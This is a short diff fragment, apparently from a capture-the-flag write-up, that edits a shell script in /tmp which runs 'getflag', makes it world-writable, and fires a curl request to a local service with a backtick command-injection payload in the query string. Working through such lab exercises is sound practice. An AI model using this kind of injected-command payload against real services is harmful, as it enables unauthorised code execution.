@@ -16,8 +16,9 @@ https://www.howtogeek.com/howto/29980/whats-the-difference-between-single-and-do
 ```
 cat /tmp/GETFLAG
 #!/bin/bash
-getflag > /tmp/mdp
+getflag > /tmp/flag
 
+touch /tmp/flag
 chmod 777 /tmp/GETFLAG
 
 curl localhost:4646?x='`/*/GETFLAG`' 
